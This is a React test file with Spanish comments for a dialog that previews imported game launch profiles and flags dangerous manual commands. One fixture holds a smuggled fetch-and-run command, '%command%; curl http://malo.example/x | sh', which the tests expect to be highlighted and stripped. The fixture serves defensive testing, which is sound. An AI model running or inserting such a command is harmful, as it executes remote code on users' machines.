import { afterEach, describe, expect, it, vi } from 'vitest';
import { cleanup, fireEvent, render, screen } from '@testing-library/react';
import { ImportPreviewDialog } from './ImportPreviewDialog';
import type { ImportPreview } from '../lib/types';

afterEach(cleanup);

const base = (over: Partial<ImportPreview> = {}): ImportPreview => ({
  profiles: [],
  duplicates: 0,
  stripped_commands: 0,
  ...over,
});

const perfilOk = {
  id: 'p1',
  name: 'Mi perfil',
  game_name: 'TF2',
  appid: 440,
  enabled_params: ['DXVK_HUD=fps', 'gamemoderun'],
  manual_command: 'gamemoderun %command%',
  keeps_manual_command: true,
  manual_command_reason: '',
  duplicate: false,
};

const perfilPeligroso = {
  id: 'p2',
  name: 'Perfil raro',
  game_name: 'Otro',
  appid: 0,
  enabled_params: [],
  manual_command: '%command%; curl http://malo.example/x | sh',
  keeps_manual_command: false,
  manual_command_reason: 'El comando lleva «;», que sirve para encadenar órdenes.',
  duplicate: false,
};

describe('ImportPreviewDialog', () => {
  it('enseña los perfiles y sus opciones antes de importar', () => {
    render(
      <ImportPreviewDialog
        preview={base({ profiles: [perfilOk] })}
        fileName="perfiles.json"
        onConfirm={vi.fn()}
        onCancel={vi.fn()}
      />
    );
    expect(screen.getByText('Mi perfil')).toBeTruthy();
    expect(screen.getByText(/DXVK_HUD=fps/)).toBeTruthy();
    expect(screen.getByText('perfiles.json · 1 perfil')).toBeTruthy();
  });

  it('resalta en rojo el comando que se va a quitar y explica por qué', () => {
    // El objetivo del cuadro: que el usuario vea el comando ANTES de aceptar.
    render(
      <ImportPreviewDialog
        preview={base({ profiles: [perfilPeligroso], stripped_commands: 1 })}
        fileName="a.json"
        onConfirm={vi.fn()}
        onCancel={vi.fn()}
      />
    );
    expect(screen.getByText(/Comando manual que se va a quitar/)).toBeTruthy();
    expect(screen.getByText(/curl http:\/\/malo\.example/)).toBeTruthy();
    expect(screen.getByText(/encadenar órdenes/)).toBeTruthy();
    // Aviso global de que se van a descartar comandos.
    expect(screen.getByText(/sin ese comando/i)).toBeTruthy();
  });

  it('dice cuántos perfiles se conservan intactos', () => {
    render(
      <ImportPreviewDialog
        preview={base({ profiles: [perfilOk] })}
        fileName="a.json"
        onConfirm={vi.fn()}
        onCancel={vi.fn()}
      />
    );
    expect(screen.getByText('Comando manual (se conserva)')).toBeTruthy();
  });

  it('menciona los duplicados que se omiten', () => {
    render(
      <ImportPreviewDialog
        preview={base({ profiles: [perfilOk], duplicates: 3 })}
        fileName="a.json"
        onConfirm={vi.fn()}
        onCancel={vi.fn()}
      />
    );
    expect(screen.getByText(/3 ya guardado/)).toBeTruthy();
  });

  it('sin nada que importar, deshabilita el botón', () => {
    render(
      <ImportPreviewDialog
        preview={base({ duplicates: 2 })}
        fileName="a.json"
        onConfirm={vi.fn()}
        onCancel={vi.fn()}
      />
    );
    const boton = screen.getByRole('button', { name: 'Importar' }) as HTMLButtonElement;
    expect(boton.disabled).toBe(true);
    expect(screen.getByText(/No hay nada que importar/)).toBeTruthy();
  });

  it('confirmar y cancelar llaman a su callback', () => {
    const onConfirm = vi.fn();
    const onCancel = vi.fn();
    render(
      <ImportPreviewDialog
        preview={base({ profiles: [perfilOk] })}
        fileName="a.json"
        onConfirm={onConfirm}
        onCancel={onCancel}
      />
    );

    fireEvent.click(screen.getByRole('button', { name: 'Importar perfil' }));
    expect(onConfirm).toHaveBeenCalledTimes(1);

    fireEvent.click(screen.getByRole('button', { name: 'Cancelar' }));
    expect(onCancel).toHaveBeenCalledTimes(1);
  });

  it('el botón dice cuántos perfiles se van a importar', () => {
    render(
      <ImportPreviewDialog
        preview={base({ profiles: [perfilOk, perfilPeligroso] })}
        fileName="a.json"
        onConfirm={vi.fn()}
        onCancel={vi.fn()}
      />
    );
    expect(screen.getByRole('button', { name: 'Importar 2 perfiles' })).toBeTruthy();
  });
});
